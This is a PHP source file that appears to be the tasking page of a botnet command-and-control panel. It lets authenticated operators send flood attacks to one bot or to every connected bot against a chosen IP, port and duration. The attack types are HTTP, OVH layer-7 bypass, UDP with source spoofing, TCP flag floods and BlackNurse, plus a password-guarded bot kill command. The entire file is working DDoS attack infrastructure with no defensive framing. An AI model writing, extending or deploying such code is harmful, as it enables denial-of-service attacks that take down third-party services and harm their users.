<?php
ob_start();
session_start();

if (!isset($_SESSION["authenticated"])) {
    header("Location: ./403.php");
} else {
    include "./config/config.php";
    $dbConnection = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));
}

if (isset($_POST["submit"])) {
  $isValid = false;
  if ($_POST["seltask"] != "KILL") {
      $isValid = isset($_POST["hostname"]) && !empty($_POST["hostname"]) && isset($_POST["ip"]) && !empty($_POST["ip"]) && isset($_POST["port"]) && !empty($_POST["port"]) && isset($_POST["time"]) && !empty($_POST["time"]);
  } else {
      $isValid = isset($_POST["hostname"]) && !empty($_POST["hostname"]) && isset($_POST["killpassword"]) && !empty($_POST["killpassword"]);
  }

  if ($isValid) {
      if ($_POST["hostname"] != "all connected bots" && $_POST["hostname"] != "all bots") {
          $hostname[] = $_POST["hostname"];
      } else {
          if ($_POST["hostname"] == "all connected bots") {
              $statement = $dbConnection->prepare("SELECT hostname FROM hosts where status = 'connected'");
              $statement->execute();
              $hostname = $statement->fetchAll(PDO::FETCH_COLUMN, 0);
          } else {
              $statement = $dbConnection->prepare("SELECT hostname FROM hosts");
              $statement->execute();
              $hostname = $statement->fetchAll(PDO::FETCH_COLUMN, 0);
          }
      }
      
      $command = buildCommand($_POST["seltask"], $_POST);
      
      if (isset($command)) {
          $username = $_SESSION["username"];
          insertTasksAndOutputs($dbConnection, $username, $_POST["seltask"], $hostname, $command);
          displaySuccessMessage();
      }
  } else {
      echo "<br><div class='alert alert-danger'>Please fill out all fields.</div>";
  }
}

function buildCommand($seltask, $postData) {

    if ($postData["time"] > 7200)
        $postData["time"] = 7200;

    $commonData = $postData["ip"] . "|" . $postData["port"] . "|" . $postData["time"];

    switch ($seltask) {
        case "HTTP":
            if (isset($_POST["path"]) && !empty($_POST["path"]) && isset($_POST["method"]) && !empty($_POST["method"]) && isset($_POST["power"]) && !empty($_POST["power"])) {
                return $commonData . "|" . $_POST["path"] . "|" . $_POST["method"] . "|" . $_POST["power"];
            }
            break;
        case "OVHL7":
            if (isset($_POST["power"]) && !empty($_POST["power"])) {
                return $commonData . "|" . $_POST["power"];
            }
            break;
        case "HTTPSOCKET":
            if (isset($postData["power"]) && !empty($postData["power"]))
                return $commonData . "|" . $postData["power"];
            break;
        case "UDP":
            if (isset($postData["packetsize"]) && !empty($postData["packetsize"]))
                return $commonData . "|" . $postData["packetsize"] . "|1" . (isset($postData["spoofit"]) ? "|" . rand(1, 31) : "");
            break;
        case "BLACKNURSE":
            return $postData["ip"] . "|" . $postData["time"];
        case "UDPPPS":
            if (isset($postData["ppspacketsize"]) && !empty($postData["ppspacketsize"]))
                return $commonData . "|" . $postData["ppspacketsize"];
            break;
        case "TCP":
            if (isset($postData["packetsize"]) && !empty($postData["packetsize"]) &&  isset($postData["checkboxes"])) {
                $flags = implode(", ", $postData["checkboxes"]);
                if ($flags === "syn, rst, fin, ack, psh")
                    $flags = "all";
                return $commonData . "|" . $flags . "|" . $postData["packetsize"] . "|1" . (isset($postData["spoofit"]) ? "|" . rand(1, 31) : "");
            }
            break;
        case "KILL":
            if (isset($postData["killpassword"]) && !empty($postData["killpassword"]))
                return "|" . $postData["killpassword"];
            break;
        default:
            echo "<br><div class='alert alert-danger'>Please fill out all fields.</div>";
            header('Refresh: 3; URL=./tasks.php');
            return null;
    }

    return $commonData;
}

function insertTasksAndOutputs($dbConnection, $username, $action, $hostnames, $command) {
  foreach ($hostnames as $hostname) {
      $statement = $dbConnection->prepare("INSERT INTO tasks (user, action, hostname, secondary) VALUES (:user, :action, :hostname, :secondary)");
      $statement->bindValue(":user", $username);
      $statement->bindValue(":action", $action);
      $statement->bindValue(":hostname", $hostname);
      $statement->bindValue(":secondary", $command);
      $statement->execute();

      $statement = $dbConnection->prepare("INSERT INTO output (user, hostname, action, secondary, status) VALUES (:user, :hostname, :action, :secondary, :status)");
      $statement->bindValue(":user", $username);
      $statement->bindValue(":hostname", $hostname);
      $statement->bindValue(":action", $action);
      $statement->bindValue(":secondary", $command);
      $statement->bindValue(":status", "N");
      $statement->execute();
  }

  $statement->connection = null;
}

function displaySuccessMessage() {
    echo "<br><div class='alert alert-success'>Successfully tasked command. Redirecting back to command.php in 3 seconds. Do not refresh the page.</div>";
    header('Refresh: 3; URL=./tasks.php');
}

ob_end_flush();
?>
